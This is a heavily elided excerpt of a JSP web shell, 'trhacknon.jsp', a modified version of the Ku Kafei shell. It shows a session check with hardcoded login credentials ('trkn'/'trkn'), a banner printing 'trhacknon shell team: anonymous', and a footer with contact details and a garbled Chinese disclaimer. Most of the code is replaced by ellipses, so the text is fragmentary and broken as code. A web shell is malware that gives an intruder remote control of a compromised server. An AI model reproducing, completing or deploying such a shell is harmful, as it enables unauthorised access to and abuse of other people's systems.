...
<%
	/**
	 ...
	 @Filename： trhacknon.jsp 
	 @Description： 苦咖啡修改个人专用版。
	 @Author： stlouisy
	 @Email： trhacknon@gmail.com
	 */
%>
...
<%
	...
	if (session.getAttribute("ID") == null) {
		...
		String username = "trkn";
		String password = "trkn";
		// the user and pass  field  
				...
				<DIV id="tabcontentcontainer">
					...
					<%
					{
						try { 
							...
							pw.println("print \"trhacknon shell\nteam: anonymous.\\n\";");
	...
	line-height: 25px;
				...
				<div class="voilet">
					<ul>
						<li>
							我的BLOG：
							<a href="trhacknon" target="_blank">trhacknon</a>
						</li>
						<li style="color: red;">
							苦咖啡修改加强版，请误使用非法用途
						</li>
						<li>
							邮箱:trhacknon@gmail.com
						</li>
					</ul>
				</div>